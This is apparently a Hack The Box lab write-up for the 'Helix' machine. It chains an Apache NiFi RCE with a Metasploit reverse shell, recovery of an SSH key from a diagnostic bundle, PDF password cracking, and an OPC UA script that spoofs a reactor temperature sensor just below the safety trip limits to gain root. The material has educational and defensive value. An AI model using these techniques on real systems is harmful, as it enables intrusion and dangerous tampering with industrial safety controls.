# HTB Write-Up: Helix

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Helix)        |
| Difficulty | Hard                                                             |
| OS         | Linux                                                            |
| Author     | Samurai                                                           |
| Date       | May 17, 2026                                                     |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Vhost Discovery & Apache NiFi](#2-enumeration--vhost-discovery--apache-nifi)
3. [Initial Access — Apache NiFi RCE](#3-initial-access--apache-nifi-rce)
4. [Lateral Movement — SSH Key Recovery from NiFi Support Bundle](#4-lateral-movement--ssh-key-recovery-from-nifi-support-bundle)
5. [Privilege Escalation — OPC UA Manipulation & Maintenance Console](#5-privilege-escalation--opc-ua-manipulation--maintenance-console)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **Nmap** for service and version fingerprinting:

```bash
nmap -A -p- 10.129.58.236
```

**Open Ports:**

| Port | Service | Details                        |
|------|---------|--------------------------------|
| 22   | SSH     | OpenSSH (Ubuntu)               |
| 80   | HTTP    | Apache — multiple vhosts       |

---

## 2. Enumeration — Vhost Discovery & Apache NiFi

### 2.1 — Vhost Discovery

The target was added to `/etc/hosts` and virtual host enumeration was performed against port 80:

```bash
echo "10.129.58.236 helix.htb" >> /etc/hosts

ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://helix.htb -H "Host: FUZZ.helix.htb" \
     -fw <baseline_word_count>
```

A second vhost was discovered: **`flow.helix.htb`**

```bash
echo "10.129.58.236 flow.helix.htb" >> /etc/hosts
```

### 2.2 — Apache NiFi Fingerprinting

Browsing to `http://flow.helix.htb/nifi` revealed an instance of **Apache NiFi 1.21.0** — an open-source data flow automation platform. The version was confirmed from the UI footer and API endpoint:

```
http://flow.helix.htb/nifi-api/system-diagnostics
```

Apache NiFi 1.21.0 is affected by **CVE-2023-34468**, an authenticated Remote Code Execution vulnerability via JDBC URL injection through the H2 database processor.

---

## 3. Initial Access — Apache NiFi RCE

### 3.1 — Vulnerability Background

Apache NiFi exposes a REST API that allows authenticated users to create and configure data processors. The H2 database `GetHTTP` processor accepts a JDBC connection URL that can be weaponised to execute arbitrary OS commands on the server. In NiFi 1.21.0, this endpoint is accessible without authentication.

### 3.2 — Exploitation via Metasploit

The Metasploit module for Apache NiFi API RCE was used:

```bash
msfconsole

use exploit/multi/http/apache_nifi_processor_rce
set RHOSTS flow.helix.htb
set RPORT 80
set LHOST 10.10.14.109
set LPORT 4444
run
```

**Result — Shell obtained as `nifi`:**

```
[*] Started reverse TCP handler on 10.10.14.109:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending request to create processor...
[*] Command shell session 1 opened
nifi@helix:/opt/nifi-1.21.0$
```

---

## 4. Lateral Movement — SSH Key Recovery from NiFi Support Bundle

### 4.1 — Enumerating the NiFi Directory

Post-exploitation enumeration of the NiFi installation directory revealed a **support-bundles** folder containing diagnostic archives:

```bash
find /opt/nifi-1.21.0 -name "*.zip" -o -name "*.tar.gz" 2>/dev/null
ls /opt/nifi-1.21.0/support-bundles/
```

Inside one of the support bundle archives, a backup of the `operator` user's private SSH key was found:

```bash
cd /opt/nifi-1.21.0/support-bundles/
unzip <bundle>.zip
find . -name "id_rsa" -o -name "*.pem"
```

### 4.2 — SSH as Operator

The private key was copied to the attacker machine and used to authenticate as `operator`:

```bash
# On attacker machine
chmod 600 id_rsa
ssh -i id_rsa operator@10.129.58.236
```

**User flag retrieved from `/home/operator/user.txt`.**

---

## 5. Privilege Escalation — OPC UA Manipulation & Maintenance Console

### 5.1 — Sudo Enumeration

```bash
sudo -l
```

**Output:**

```
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Running the binary immediately returned:

```
Maintenance window CLOSED.
```

The binary checks for a valid maintenance window before granting access. Further investigation was required.

### 5.2 — Internal Services Enumeration

Open ports were checked:

```bash
ss -tulnp
```

Key internal services identified:

| Port | Service |
|------|---------|
| 4840 | OPC UA server (`opc.tcp://127.0.0.1:4840/helix/`) |
| 8081 | Helix HMI — Reactor Panel (HTTP) |
| 8080 | Apache NiFi |

Browsing port 8081 revealed a **Helix Industries Reactor HMI** panel displaying live reactor telemetry: Temperature, Pressure, Safety status, and a **Privileged Maintenance Window** status showing `CLOSED`.

### 5.3 — PLC Documentation — Password-Protected PDF

The operator home directory contained `Operator Control & Safety Guide.pdf`, which was password-protected. The hash was extracted and cracked:

```bash
pdf2john "Operator Control & Safety Guide.pdf" > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
```

**Password recovered: `operator1`**

The PDF detailed the **Maintenance Operating Window** conditions:

> The window opens when Temperature reaches approximately **295°C OR Pressure ≥ 73 bar**, while remaining below trip thresholds and with no active safety trip.

### 5.4 — OPC UA Node Enumeration

An SSH tunnel was created to expose the OPC UA service to the attacker machine:

```bash
ssh -L 4840:127.0.0.1:4840 operator@10.129.58.236 -i id_rsa
```

The `asyncua` Python library (already installed on the target) was used to enumerate the OPC UA node tree:

```python
import asyncio
from asyncua import Client

async def main():
    c = Client("opc.tcp://127.0.0.1:4840/helix/")
    await c.connect()

    def browse(node, indent=0): pass  # recursive browse

    root = c.get_objects_node()
    children = await root.get_children()
    for child in children:
        name = await child.read_browse_name()
        print(f"{child.nodeid} | {name}")

asyncio.run(main())
```

The custom namespace (NamespaceIndex=2) exposed the full industrial process node tree:

| NodeId   | Name              |
|----------|-------------------|
| ns=2;i=3 | TemperatureRaw    |
| ns=2;i=4 | Temperature       |
| ns=2;i=5 | Pressure          |
| ns=2;i=6 | CalibrationOffset |
| ns=2;i=8 | RodsInserted      |
| ns=2;i=9 | EmergencyCooling  |
| ns=2;i=10| TripActive        |
| ns=2;i=12| Mode              |
| ns=2;i=13| TestOverride      |
| ns=2;i=14| ResetTrip         |

### 5.5 — OPC UA Manipulation to Trigger Maintenance Window

The safety controller writes `/opt/helix/state/maintenance_window` only when it detects a hazardous test condition — Temperature ≥ 295°C — while no safety trip is active. The key insight was that `CalibrationOffset` adds to the raw temperature reading, and a value of **11.0** pushed the displayed temperature to exactly **295.x°C** without crossing the trip threshold that would activate rods and emergency cooling.

The following sequence was required — order matters:

1. Set `Mode` → `MAINTENANCE`
2. Set `TestOverride` → `True`
3. Set `CalibrationOffset` → `11.0`

```python
import asyncio
from asyncua import Client, ua

async def main():
    c = Client("opc.tcp://127.0.0.1:4840/helix/")
    c.set_user("operator")
    c.set_password("operator1")
    await c.connect()

    mode = c.get_node("ns=2;i=12")
    tov  = c.get_node("ns=2;i=13")
    cal  = c.get_node("ns=2;i=6")
    temp = c.get_node("ns=2;i=4")

    await mode.write_value(ua.DataValue(ua.Variant("MAINTENANCE", ua.VariantType.String)))
    await tov.write_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
    await cal.write_value(ua.DataValue(ua.Variant(11.0, ua.VariantType.Double)))

    print("[*] Holding — run helix-maint-console NOW!")
    while True:
        await mode.write_value(ua.DataValue(ua.Variant("MAINTENANCE", ua.VariantType.String)))
        await tov.write_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
        await cal.write_value(ua.DataValue(ua.Variant(11.0, ua.VariantType.Double)))
        t = await temp.read_value()
        print(f"\r[*] Temp={t:.1f}°C", end="", flush=True)
        await asyncio.sleep(0.2)

asyncio.run(main())
```

> **Note:** Offsets larger than ~12°C caused the safety controller to activate `RodsInserted` and `EmergencyCooling`, which blocked the maintenance window from opening even when temperature was above threshold. The calibration offset of **11.0** was the precise value needed to stay in the narrow window between normal operations and the safety trip boundary.

With the script running and the values held, the maintenance console was executed from the SSH session:

```bash
sudo /usr/local/sbin/helix-maint-console
```

**Result — Root shell obtained:**

```
[+] Privileged maintenance access granted
[!] Window expires in 83 seconds
[!] Session will be terminated automatically
root@helix:/tmp#
```

**Root flag retrieved from `/root/root.txt`.**

---

## 6. Summary

| Phase                  | Technique                                                                 | Result                                      |
|------------------------|---------------------------------------------------------------------------|---------------------------------------------|
| Recon                  | Nmap -A                                                                   | Ports 22, 80 identified                     |
| Vhost Discovery        | ffuf against Host header                                                  | `flow.helix.htb` discovered                 |
| Fingerprinting         | NiFi UI + API                                                             | Apache NiFi 1.21.0 — CVE-2023-34468         |
| Initial Access         | Metasploit `apache_nifi_processor_rce`                                    | Shell as `nifi`                             |
| Lateral Movement       | SSH key recovered from NiFi support bundle                                | Shell as `operator` + user flag             |
| PDF Cracking           | `pdf2john` + `john` → `operator1`                                        | Maintenance window conditions revealed      |
| OPC UA Enumeration     | `asyncua` Python client over SSH tunnel                                   | Full node tree mapped                       |
| Privilege Escalation   | OPC UA write — Mode + TestOverride + CalibrationOffset=11.0              | Maintenance window opened → root shell      |

### Key Takeaways

- **Industrial control systems exposed internally can be a direct path to privilege escalation.** OPC UA servers managing PLC state are not typically considered attack surface in a web pentest context — but when exposed on localhost with weak or reused credentials, they provide a powerful lever for manipulating system behaviour.

- **Support and diagnostic bundles are a significant data leakage risk.** NiFi's support bundle feature archived sensitive operator credentials that were never intended to be accessible from the NiFi service account. Backup and diagnostic archives should be stored with strict access controls and audited regularly for sensitive content.

- **Credential reuse across services remains a reliable lateral movement path.** The PDF password `operator1` also served as the OPC UA authentication credential — a single cracked password unlocked the entire privilege escalation chain.

- **Understanding the exact thresholds of a safety system is essential for precise exploitation.** A calibration offset that was too large tripped the safety controller and locked out the maintenance window. The narrow band between normal operations and safety trip limits required careful tuning — real-world ICS attacks depend on this same precision to avoid triggering alarms.
